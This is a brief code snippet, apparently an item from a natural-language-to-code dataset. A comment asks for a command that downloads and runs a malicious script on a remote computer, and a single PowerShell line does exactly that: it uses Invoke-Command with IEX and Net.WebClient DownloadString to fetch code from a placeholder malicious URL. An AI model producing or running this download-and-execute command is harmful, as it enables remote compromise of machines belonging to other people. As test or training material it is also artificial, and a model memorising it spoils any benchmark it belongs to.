# Natural language intent:
# Invoke a command on a remote computer to download and execute a malicious script from a specified URL.

Invoke-Command -ComputerName <target_IP> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://sospiciousbad.url/threat')}
